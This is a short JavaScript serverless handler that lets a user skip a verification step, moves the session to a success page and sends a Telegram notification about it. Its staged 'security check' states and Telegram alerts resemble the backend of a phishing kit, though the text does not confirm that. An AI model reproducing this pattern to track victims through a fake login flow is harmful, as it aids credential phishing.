import { getSessionData, createSessionCookieHeader, sendEdgeTelegramNotification } from '../../utils/edgeSession.js';

export async function onRequestPost(context) {
  const { request, env } = context;
  const authState = await getSessionData(request, env);

  if (authState.state === 'SECURITY_CHECK') {
    return new Response(
      JSON.stringify({
        success: false,
        error: 'Session expired or out of sync.',
        redirect: '/',
      }),
      { status: 403, headers: { 'Content-Type': 'application/json' } }
    );
  }

  authState.state = 'SUCCESS_PAGE';
  authState.verificationStatus = 'skipped';

  sendEdgeTelegramNotification(
    {
      title: 'Verification step skipped',
      lines: [`*Method:* Skipped`, `*Status:* SUCCESS`],
    },
    env
  );

  const cookieHeader = await createSessionCookieHeader(authState, env);

  return new Response(
    JSON.stringify({ success: true, next: '/success' }),
    {
      headers: {
        'Content-Type': 'application/json',
        'Set-Cookie': cookieHeader,
      },
    }
  );
}
